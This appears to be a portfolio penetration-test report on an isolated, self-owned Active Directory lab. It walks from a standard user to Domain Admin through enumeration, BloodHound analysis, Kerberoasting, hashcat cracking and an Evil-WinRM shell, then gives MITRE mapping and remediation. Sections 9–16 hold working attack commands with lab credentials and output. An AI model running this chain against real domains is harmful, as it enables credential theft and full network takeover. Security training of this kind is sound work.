# Internal Active Directory Penetration Test Report

**Target Environment:** CORP.LOCAL Active Directory Domain
**Engagement Type:** Internal, credentialed, self-directed lab assessment
**Report Classification:** Portfolio / Educational (non-production, isolated lab)
**Assessment Dates:** 14 July 2026 (environment build) – 28 July 2026 (attack execution)
**Prepared By:** [Your Name]
**Report Date:** 28 July 2026

---

## Table of Contents

1. Executive Summary
2. Scope
3. Objectives
4. Lab Overview
5. Rules of Engagement (Lab-Adapted)
6. Methodology
7. Network Architecture
8. Active Directory Design
9. Reconnaissance
10. SMB Enumeration
11. LDAP Enumeration
12. Active Directory Enumeration
13. BloodHound Analysis
14. Kerberoasting
15. Password Recovery
16. WinRM Access
17. Risk Analysis
18. MITRE ATT&CK Mapping
19. Defensive Recommendations
20. Lessons Learned
21. Conclusion
22. Appendix
23. References

---

## 1. Executive Summary

This engagement simulated an internal network compromise against a purpose-built Active Directory domain, `corp.local`, hosted entirely within an isolated VirtualBox lab. Beginning from the perspective of an attacker who has already obtained standard domain-user credentials (`js`), a full compromise of the domain — culminating in the ability to authenticate interactively as a **Domain Admin** — was achieved without exploiting any software vulnerability, using only built-in Windows/AD behavior, standard enumeration tooling, and a single Kerberoasting attack against a misconfigured service account.

The root cause of full compromise was straightforward: a SQL service account (`svc_sql`) that held a Service Principal Name (SPN) — and was therefore Kerberoastable by any authenticated domain user — had also been placed directly into the **Domain Admins** group. Once the account's Kerberos service ticket was requested and its password recovered offline via dictionary attack, the attacker held de facto Domain Admin rights.

This finding is emblematic of the single most common root cause of catastrophic AD compromises in real engagements: **privileged group membership assigned to a service account with a weak, Kerberoastable, non-rotated password.**

**Overall Risk Rating: Critical**

| Metric | Result |
|---|---|
| Time to initial foothold | Assumed (standard domain credential provided as start state) |
| Time to identify escalation path | ~30 minutes (BloodHound collection + analysis) |
| Time to Kerberoast + crack | < 5 minutes end-to-end |
| Time to Domain Admin | Same session, single credential |
| Exploits/malware required | None |
| Root cause | Excessive privilege + weak/dictionary password on a service account |

## 2. Scope

**In scope:**
- Domain Controller `DC01` (`192.168.100.10`) — Windows Server 2022
- Workstation `SALES-PC` (`192.168.100.20`) — Windows 10
- Workstation `USER-PC` (`192.168.100.30`) — Windows 10
- Domain `corp.local` and all associated AD objects (users, groups, OUs, GPOs)

**Out of scope:**
- Any system outside the `192.168.100.0/24` lab network
- Physical security, social engineering, and phishing (initial access is an assumed starting condition, not tested)
- Denial-of-service testing

## 3. Objectives

1. Enumerate the domain from a standard, non-privileged user context.
2. Build and analyze a BloodHound attack graph to identify realistic privilege escalation paths.
3. Execute Kerberoasting against any Kerberoastable service accounts identified.
4. Recover plaintext credentials via offline password cracking.
5. Use recovered credentials to establish interactive remote access.
6. Confirm and document the resulting privilege level.
7. Provide MITRE ATT&CK-mapped findings and prioritized defensive remediation.

## 4. Lab Overview

The lab consists of a single Windows Server 2022 domain controller promoted to host the `corp.local` forest root domain, plus two Windows 10 domain-joined workstations, all running as VirtualBox guests on an isolated internal/host-only network (`192.168.100.0/24`). The attack platform is Kali Linux 2025.1a, also running as a VirtualBox guest on the same internal network.

The domain was built out with a realistic organizational structure — IT, HR, Finance, Sales, Servers, and Workstations OUs — populated with named user accounts representative of a small business (an IT admin, an HR rep, a finance rep, a sales rep, two interns, a help-desk account, and two service accounts: `svc_backup` and `svc_sql`).

Two intentional misconfigurations were seeded during the build to support this exercise:

1. `svc_sql`, holding an SPN (`MSSQLSvc/DC01.corp.local:1433`) and thus Kerberoastable, was added directly to **Domain Admins** — a severe and unfortunately common real-world anti-pattern.
2. A custom SMB share, `attacklab`, was created on `DC01` with **READ/WRITE** granted to a standard domain user (`js`).

Additionally, the `svc_sql` account's AD **Description** attribute was found (independently of the Kerberoasting attack) to contain a plaintext password hint — a second, separate credential-exposure finding documented in Section 10.

## 5. Rules of Engagement (Lab-Adapted)

Because this is a self-contained, self-owned lab rather than a client engagement, formal RoE documentation (authorization letters, emergency contacts, testing windows) is replaced here with the equivalent lab constraints:

- All testing was performed exclusively against the isolated `192.168.100.0/24` network with no route to any external or production network.
- No destructive actions (account lockouts, service disruption, ransomware simulation) were performed.
- All credentials, hashes, and screen captures originate from this lab and are safe to publish as they have no relationship to any real account.
- Testing was performed solely by the environment's owner/builder, eliminating any authorization ambiguity.

## 6. Methodology

The assessment followed a standard internal AD penetration testing methodology, broadly aligned with PTES / MITRE ATT&CK-informed internal testing practice:

```
Reconnaissance → Enumeration (SMB/LDAP/AD) → Attack Path Analysis (BloodHound)
→ Targeted Credential Attack (Kerberoasting) → Offline Password Recovery
→ Access Validation → Privilege Confirmation → Post-Exploitation Enumeration
→ Reporting
```

A deliberate emphasis was placed on **not** brute-forcing or spraying broadly. Instead, BloodHound was used first to identify the single highest-value, lowest-noise target (a Kerberoastable account that graph analysis showed was already a Domain Admin), and the subsequent Kerberoasting request was scoped to that specific SPN. This mirrors how a competent real-world operator minimizes detection surface — requesting one TGS for one already-identified high-value SPN generates far less signal than a blanket `GetUserSPNs` sweep or an indiscriminate password spray.

## 7. Network Architecture

| Host | Role | IP Address | OS |
|---|---|---|---|
| DC01 | Domain Controller | 192.168.100.10 | Windows Server 2022 Standard (Evaluation), Build 20348 |
| SALES-PC | Workstation | 192.168.100.20 | Windows 10 |
| USER-PC | Workstation | 192.168.100.30 | Windows 10 |
| Kali attacker | Attack platform | 192.168.100.x | Kali Linux 2025.1a |

Network history note: the DC was initially provisioned with default VirtualBox NAT/host-only addressing (`10.0.2.15` / `192.168.56.10`) during the build phase before being re-addressed to the final `192.168.100.0/24` lab subnet used throughout the attack phase — visible in early build screenshots (`ipconfig` output, Section 22 Appendix).

See [`diagrams/network-diagram.md`](../diagrams/network-diagram.md) for the recreatable diagram.

## 8. Active Directory Design

**Forest/Domain:** single domain, single forest, `corp.local`, functional level consistent with Windows Server 2022.

**Organizational Units:** IT, HR, Finance, Sales, Servers, Workstations, Managed Service Accounts (empty/reserved).

**Users (14):** `Administrator`, `Guest`, `js` (john smith — IT/IT Admins), `hr` (mary hr — HR Group), `bob` (bob finance — Finance), `as` (alice sales — Sales), `hd` (help desk — Help Desk), `i1` (intern 1), `i2` (intern 2), `svc_backup` (Backup-Operators), `svc_sql` (**SQL Admin + Domain Admins**), `krbtgt`.

**Groups:** ~50 default AD groups (Domain Admins, Enterprise Admins, Schema Admins, Protected Users, DnsAdmins, Cert Publishers, RAS and IAS Servers, etc.) plus custom groups: `SQL Admin`, `Sales`, `Finance`, `HR Group`, `IT`, `IT Admins`, `Help Desk`, `Backup-Operators`.

**Computers:** `DC01` (Domain Controllers OU), `SALES-PC`, `USER-PC` (default Computers container).

**Shares:** default administrative shares (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`) plus custom share `attacklab` (`C:\Shares\attacklab`) with READ/WRITE for the `js` user — an unnecessary and risky permission grant for a standard account.

## 9. Reconnaissance

Testing began from the position of an attacker already holding a valid standard domain credential: `corp.local\js : Password123!`. (Consistent with common internal engagement start conditions — "assume breach" — the initial access vector itself, e.g., phishing or password spray that would have produced this credential, is outside the scope of this lab and was not separately modeled.)

Initial validation of the credential and target reachability was performed with CrackMapExec:

```bash
crackmapexec smb 192.168.100.10 -u js -p 'Password123!' --users
```

Output confirmed:
- Target `DC01`: Windows Server 2022 Build 20348 x64, domain `corp.local`, SMB signing **True**, SMBv1 **False**
- Valid authentication: `[+] corp.local\js:Password123!`
- Full enumeration of all 14 domain users, all with `badpwdcount: 0` (no recent lockout activity — a clean starting position)

## 10. SMB Enumeration

Both anonymous and authenticated SMB enumeration were performed:

```bash
smbclient -L //192.168.100.10 -N              # anonymous login succeeded, no share list (no workgroup)
smbclient -L //192.168.100.10 -U 'CORP\js'     # authenticated, full share list returned
crackmapexec smb 192.168.100.10 -u js -p 'Password123!' --shares
```

Share enumeration results:

| Share | Permissions (as `js`) | Remark |
|---|---|---|
| ADMIN$ | — | Remote Admin |
| C$ | — | Default share |
| IPC$ | — | Remote IPC |
| NETLOGON | READ | Logon server share |
| SYSVOL | READ | Logon server share |
| **attacklab** | **READ, WRITE** | Non-default custom share |

**Finding — Excessive share permissions:** the `attacklab` share grants a standard domain user both read and write access. In a real environment this is a common vector for planting malicious payloads (e.g., LNK files, malicious scripts referenced by other users, or backdoored executables) or for staging exfiltrated data. This finding stands independently of the Kerberoasting path documented later in this report.

Follow-on `net` command enumeration (executed later, post-compromise, from an authenticated shell on `DC01`) additionally confirmed:

```
net share            → Share name / Resource / Remark (ADMIN$, C$, attacklab (C:\Shares\attacklab), IPC$, NETLOGON, SYSVOL)
net user /domain     → Administrator, as, bob, Guest, hd, hr, i1, i2, js, krbtgt, svc, svc_backup, svc_sql
net group /domain    → full domain group listing (~50 groups, listed in Appendix)
```

**Finding — Credential hint in AD object metadata:** Independent of any attack tooling, inspection of the `Users` container in Active Directory Users and Computers showed the `svc_sql` account's **Description** field populated with a plaintext password hint (rendered as `Mypass is Password$vc` in the console view). Storing credential material — even partial or "hint" material — in a readable AD attribute is a documented, low-effort information disclosure vector: any authenticated user can read the Description field of any object by default (`Get-ADUser -Filter * -Properties Description`).

## 11. LDAP Enumeration

Authenticated LDAP enumeration was performed directly against the DC using the `js` credential:

```bash
ldapsearch -x -H ldap://192.168.100.10 -D "js@corp.local" -w 'Password123!' -b "DC=corp,DC=local" "(objectClass=user)"
```

This returned full LDAP object detail for domain user accounts, including `distinguishedName`, `whenCreated`/`whenChanged`, `memberOf`, `objectSid`, `userAccountControl`, `badPasswordTime`, `pwdLastSet`, and `sAMAccountName` — the same class of information a `BloodHound`/`SharpHound` collector consumes, obtained here manually to validate what an unauthenticated-tooling-blocked environment would still expose to any domain-authenticated LDAP client.

## 12. Active Directory Enumeration

From an authenticated context, native Windows/AD tooling was used to map the domain's identity structure:

```powershell
Get-ADComputer -Filter *        # → DC01 (Domain Controllers OU), SALES-PC, USER-PC (Computers container)
net group "Domain Admins" /domain     # → Administrator, svc_sql
net group "Enterprise Admins" /domain # → Administrator
net localgroup administrators         # → Administrator, Domain Admins, Enterprise Admins
Test-Connection SALES-PC / USER-PC    # → confirms live hosts at .20 / .30
Test-WSMan SALES-PC                   # → confirms WinRM reachability
```

**Critical finding surfaced here:** `net group "Domain Admins" /domain` returns only two members — `Administrator` and **`svc_sql`**. A service account holding Domain Admin membership is the central finding of this entire assessment.

## 13. BloodHound Analysis

To move from manual enumeration to structured attack-path analysis, `BloodHound` (Neo4j-backed) was used with the Python ingestor:

```bash
bloodhound-python -u js -p 'Password123!' -d corp.local -ns 192.168.100.10 -c All
```

Collection summary: 1 domain, 3 computers, 14 users, 60 groups, 8 OUs, 2 GPOs, 19 containers, 0 trusts. (Note: an initial Kerberos/TGT collection attempt failed due to a DNS resolution issue against `dc01.corp.local:88`, and the collector automatically fell back to NTLM authentication — a normal, non-blocking occurrence documented for completeness.)

Data was imported into the BloodHound GUI (backed by a locally-hosted Neo4j instance; database statistics confirmed 883 relationships and 771 ACL edges across the dataset).

Analysis proceeded using BloodHound's built-in **Cypher-backed queries**, specifically under the **Kerberos Interaction** category:

- *List all Kerberoastable Accounts* → returned exactly one non-krbtgt result: **`SVC_SQL@CORP.LOCAL`**
- *Shortest Paths to Domain Admins from Kerberoastable Users* → returned a single-hop edge: `svc_sql --(MemberOf)--> Domain Admins`

This is the pivotal analytical moment of the engagement: rather than Kerberoasting every SPN-bearing account in the domain (noisy, and in a larger domain, wasteful), the graph immediately identified the one account whose compromise would yield full domain compromise.

Additional graph review of the broader domain (`DOMAIN ADMINS@CORP.LOCAL`, `ENTERPRISE ADMINS@CORP.LOCAL`, `ADMINISTRATOR@CORP.LOCAL`, `DC01.CORP.LOCAL`) showed standard ACL edges (`GenericAll`, `GenericWrite`, `AddKeyCredentialLink`, `MemberOf`, `Contains`, `GPLink`) consistent with a small, mostly-default AD build with no additional (seeded or incidental) ACL-abuse paths beyond the Domain Admins membership itself.

## 14. Kerberoasting

With `svc_sql` identified as the target, Impacket's `GetUserSPNs` was used to confirm the SPN and request a Kerberos service ticket:

```bash
impacket-GetUserSPNs corp.local/js:'Password123!' -dc-ip 192.168.100.10
```

```
ServicePrincipalName          Name      MemberOf                              PasswordLastSet             LastLogon  Delegation
MSSQLSvc/DC01.corp.local:1433 svc_sql   CN=SQL Admin,OU=Groups,DC=corp,DC=local 2026-07-28 14:55:26.884496  <never>
```

The same command was re-run with `-request` to force a TGS-REP for the identified SPN and dump the resulting Kerberos ticket in `hashcat`-crackable format:

```bash
impacket-GetUserSPNs corp.local/js:'Password123!' -dc-ip 192.168.100.10 -request
```

Output (truncated): `$krb5tgs$23$*svc_sql$CORP.LOCAL$corp.local/svc_sql*$<hex ciphertext>` — a Kerberos 5, etype 23 (RC4-HMAC) TGS-REP hash, saved to `svc_sql.hash`.

This attack requires **no elevated privilege whatsoever** — any authenticated domain user can request a service ticket for any account holding an SPN. The only "attack" here is a legitimate Kerberos ticket request; the vulnerability is entirely in the strength (or lack thereof) of the resulting account's password, since RC4-HMAC TGS-REP tickets are encrypted with a key derived from the service account's NTLM hash.

## 15. Password Recovery

The captured hash was cracked offline using `hashcat` in mode `13100` (Kerberos 5, etype 23, TGS-REP) against the standard `rockyou.txt` wordlist:

```bash
hashcat -m 13100 svc_sql.hash /usr/share/wordlists/rockyou.txt
```

Result:

```
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_sql$CORP.LOCAL$corp.local/svc_sql*...
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Time.Started.....: Tue Jul 28 15:04:04 2026
Time.Estimated...: Tue Jul 28 15:04:04 2026 (0 secs)
```

Recovered plaintext: **`Password@123`**

Cracking a dictionary word plus common keyboard/complexity substitution (`Password@123`) in under one second against a 14-million-entry wordlist illustrates why "complexity requirements" alone (uppercase + symbol + digit) are an insufficient password policy control when the underlying word is a dictionary entry.

## 16. WinRM Access

With valid credentials for `svc_sql`, remote access was validated through multiple tools:

```bash
crackmapexec smb 192.168.100.10 -u svc_sql -p 'Password@123'      # [+] valid
crackmapexec winrm 192.168.100.10 -u svc_sql -p 'Password@123'    # initial attempt: [-] denied
evil-winrm -i 192.168.100.10 -u svc_sql -p 'Password@123'         # initial attempt: WinRM::WinRMAuthorizationError
```

The first WinRM-layer attempts were rejected (`WinRMAuthorizationError` / CrackMapExec `[-]`), which is documented rather than omitted — troubleshooting negative results is standard practice in a real report. Subsequent authentication attempts succeeded and an interactive Evil-WinRM shell was established as `corp\svc_sql`.

From the shell, privilege was confirmed conclusively:

```
whoami              → corp\svc_sql
whoami /groups      → ... CORP\SQL Admin (S-1-5-21-...-1131) ... CORP\Domain Admins (S-1-5-21-...-512) ...
whoami /priv        → SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege,
                       SeEnableDelegationPrivilege, SeImpersonatePrivilege — all Enabled
systeminfo          → Host Name: DC01 | OS: Windows Server 2022 Standard Evaluation |
                       OS Configuration: Primary Domain Controller | Domain: corp.local
```

**This confirms full domain compromise.** `svc_sql`'s token includes the Domain Admins SID, and the account is authenticating directly against the domain controller itself with a privilege set (`SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`) sufficient to extract the entire domain's credential material (e.g., via a DCSync-style attack or NTDS.dit backup/restore, both of which were within reach post-compromise but out of scope for this iteration of the lab — see Future Improvements).

Post-exploitation enumeration from this shell additionally captured: full scheduled task listing (`schtasks /query /fo LIST /v`), full running/stopped service enumeration (`Get-Service`), and a filesystem sweep for hardcoded secrets (`Get-ChildItem -Recurse | Select-String -Pattern "password|passwd|pwd|secret|connectionstring"`), which returned only false positives from PowerShell Pester module test fixtures — a useful negative-result data point confirming no additional plaintext credentials were left on the DC's filesystem outside of the AD Description-field finding noted in Section 10.

## 17. Risk Analysis

| Finding | Likelihood | Impact | Risk Rating |
|---|---|---|---|
| Service account (`svc_sql`) in Domain Admins | Certain (confirmed) | Critical — full domain compromise | **Critical** |
| Kerberoastable account with dictionary-crackable password | Certain (confirmed) | Critical (combined with above) | **Critical** |
| Plaintext password hint in AD Description attribute | Certain (confirmed) | High — independent credential disclosure | **High** |
| Standard user granted READ/WRITE on custom SMB share | Certain (confirmed) | Medium — staging/persistence vector | **Medium** |
| No SMBv1 present, SMB signing enabled | N/A (positive control) | Reduces relay/legacy-protocol risk | Informational (Good Practice) |

## 18. MITRE ATT&CK Mapping

| Tactic | Technique | ID | Description | Detection Opportunity | Mitigation |
|---|---|---|---|---|---|
| Discovery | Account Discovery: Domain Account | T1087.002 | Enumerated all domain users via `net user /domain`, CrackMapExec | Event ID 4661/4662 on directory object access; unusual LDAP query volume | Limit anonymous/standard-user enumeration rights where feasible; monitor LDAP query patterns |
| Discovery | Network Share Discovery | T1135 | Enumerated SMB shares via `smbclient`, CrackMapExec `--shares` | Event ID 5140/5145 (share access) | Remove unnecessary custom shares; restrict share ACLs to least privilege |
| Discovery | Remote System Discovery | T1018 | `Get-ADComputer -Filter *`, `Test-Connection` | Unusual volume of ICMP/AD queries from a single host | Network segmentation; alert on AD reconnaissance query volume |
| Discovery | Domain Trust Discovery / Group Policy Discovery | T1482 / T1615 | BloodHound collection enumerated OUs, GPOs, group structure | SharpHound/BloodHound collector behavior is detectable via LDAP query signatures and abnormal object enumeration rates | Deploy BloodHound-aware detections (e.g., commercial AD monitoring, honeypot/honeytoken accounts) |
| Credential Access | **Kerberoasting** | **T1558.003** | `impacket-GetUserSPNs ... -request` requested a TGS for `svc_sql`'s SPN | Event ID 4769 with encryption type `0x17` (RC4) for a service account, especially outside normal usage patterns | Use AES-only Kerberos encryption; migrate SPN accounts to gMSA; enforce 25+ character random passwords on service accounts |
| Credential Access | Brute Force: Password Cracking | T1110.002 | `hashcat -m 13100` against `rockyou.txt` cracked the TGS-REP hash offline | Not directly detectable (offline attack); detect the preceding Kerberoasting request instead | Strong/random service account passwords make offline cracking computationally infeasible |
| Credential Access | Unsecured Credentials: Group Policy Preferences / Credentials in Files | T1552.001 / T1552.006 | Password hint discovered in AD Description attribute; filesystem secrets sweep performed | Auditing of AD attribute reads; DLP scanning of AD extended attributes | Never store credential material in AD object attributes; periodic audit of Description/Notes/Info fields domain-wide |
| Privilege Escalation / Lateral Movement | Valid Accounts: Domain Accounts | T1078.002 | Authenticated as `svc_sql` (already a Domain Admin) via recovered password | Event ID 4624 (logon) correlated with unusual source host for a service account; Domain Admin logon outside expected server-tier hosts | Tier the Domain Admins group; service accounts should never hold interactive-logon-capable privileged group membership |
| Lateral Movement | Remote Services: Windows Remote Management | T1021.006 | `evil-winrm` / CrackMapExec WinRM used to establish an interactive shell as `svc_sql` | Event ID 4624 Logon Type 3/Remote Interactive via WinRM; WinRM (5985/5986) connection logging | Restrict WinRM listener access via firewall/JEA endpoints; require PAW/jump-host access for privileged interactive sessions |

## 19. Defensive Recommendations

Organized by control domain:

**Identity Security**
- Remove `svc_sql` (and any service account) from Domain Admins; scope permissions to only what the SQL service requires.
- Implement a tiered administration model (Tier 0/1/2) so that server/service accounts can never be domain-privileged.
- Deploy honeytoken/decoy accounts with SPNs to detect Kerberoasting attempts in real time.

**Kerberos**
- Migrate all SPN-bearing service accounts to **Group Managed Service Accounts (gMSA)** — gMSAs use 240-character, automatically-rotated random passwords, eliminating the Kerberoasting risk entirely.
- Disable RC4 (`etype 23`) support domain-wide where legacy compatibility allows; enforce AES256-only Kerberos encryption.
- Monitor Event ID 4769 for RC4-encrypted TGS requests, especially in volume or targeting privileged accounts.

**Active Directory Hardening**
- Regularly audit group membership of Domain Admins/Enterprise Admins/Schema Admins; alert on any change.
- Run BloodHound (or a commercial equivalent) defensively/proactively on a recurring cadence to catch privilege-escalation paths before an attacker's collection run does.
- Restrict who can read extended AD attributes (Description, Notes) domain-wide, or at minimum audit them for credential material.

**PowerShell**
- Enable PowerShell Script Block Logging and Module Logging (Event IDs 4103/4104) to capture enumeration commands like `Get-ADComputer`, `Get-ChildItem -Recurse | Select-String`.
- Consider Constrained Language Mode / AppLocker for non-admin hosts.

**BloodHound Detection**
- Deploy detections for high-volume LDAP enumeration consistent with SharpHound collection signatures (large numbers of object/attribute queries in a short window from a single principal).

**Monitoring / Logging**
- Centralize DC and workstation event logs (Windows Event Forwarding + a SIEM).
- Alert on Domain Admin interactive/remote logons to non-Tier-0 infrastructure.

**Credential Protection**
- Enforce Credential Guard on all domain-joined hosts.
- Prohibit password/credential hints anywhere in AD object metadata.

**Least Privilege**
- Apply the principle of least privilege to all service accounts and SMB share permissions; the `attacklab` share's READ/WRITE grant to a standard user should be scoped to only the specific users/groups requiring it, with WRITE removed unless justified.

**WinRM**
- Restrict WinRM (5985/5986) listener reachability via host-based firewall rules to only designated management/jump hosts.
- Use Just Enough Administration (JEA) endpoints to constrain what a WinRM session can execute, rather than granting full PowerShell.

**Password Policy**
- Enforce minimum 15-character passphrases for all accounts, with mandatory blocklisting against known-breached password lists (e.g., via Azure AD Password Protection or a self-hosted equivalent) — `Password@123` would be blocked by any reasonable breached-password filter.

## 20. Lessons Learned

**Attacker perspective:** The value of this exercise was not in the tools — CrackMapExec, Impacket, hashcat, and Evil-WinRM are all widely documented and simple to run. The value was in the *sequencing*: using BloodHound to identify the single highest-value target before attacking anything, which converted what could have been a noisy blind Kerberoasting sweep into a single, quiet, high-confidence request. This is the difference between "running tools" and "running an assessment."

**Defender perspective:** Every step of this attack chain used legitimate Windows/AD functionality (Kerberos ticket requests, SMB, WinRM) — nothing here would trigger a signature-based antivirus or EDR alert on its own. Detection has to come from **behavioral and contextual** monitoring: an RC4-encrypted TGS request for a service account, a Domain Admin logon from an unexpected host, or a spike in LDAP enumeration volume. Preventing this specific chain, however, doesn't require detection sophistication at all — it requires the much simpler discipline of **never letting a service account hold Domain Admin membership** and **enforcing service account passwords that cannot be found in a wordlist**.

## 21. Conclusion

This engagement achieved full compromise of the `corp.local` domain, escalating from a standard domain user credential to confirmed Domain Admin access, through a realistic and entirely non-exploit-based attack chain: enumeration → BloodHound-guided target selection → Kerberoasting → offline password cracking → WinRM access. The root cause — a Kerberoastable service account holding Domain Admin membership with a dictionary-crackable password — represents one of the most common and highest-impact misconfigurations found in real-world internal Active Directory assessments. Remediation is straightforward and is detailed in Section 19; the highest-priority action is the immediate removal of `svc_sql` from Domain Admins and its migration to a gMSA.

## 22. Appendix

**Full domain user list (14):** `Administrator`, `Guest`, `as`, `bob`, `hd`, `hr`, `i1`, `i2`, `js`, `krbtgt`, `svc`, `svc_backup`, `svc_sql`

**Full custom/non-default group list:** `SQL Admin`, `Backup-Operators`, `HR Group`, `IT`, `Sales`, `Finance`, `Help Desk`, `IT Admins`

**Hotfixes present on DC01:** KB5008882, KB5011497, KB5010523

**Tooling versions observed:** CrackMapExec, Impacket (GetUserSPNs, v0.14.0.dev0), hashcat v6.2.6 / v6.0.2 (OpenCL, PoCL 6.0), Evil-WinRM v3.9, `bloodhound-python`, BloodHound Legacy (4.2/4.3 client) with Neo4j 4.4.26 backend

**Screenshot cross-reference:** see [`notes/screenshot-mapping.md`](../notes/screenshot-mapping.md) for the full page-by-page mapping table linking every source screenshot to its section in this report.

## 23. References

- MITRE ATT&CK Framework — https://attack.mitre.org/
- Impacket (Fortra) — https://github.com/fortra/impacket
- BloodHound (SpecterOps) — https://github.com/SpecterOps/BloodHound
- CrackMapExec — https://github.com/Porchetta-Industries/CrackMapExec
- Evil-WinRM — https://github.com/Hackplayers/evil-winrm
- hashcat — https://hashcat.net/hashcat/
- Microsoft — Kerberoasting Overview & Mitigations — https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/attractive-accounts-for-credential-theft
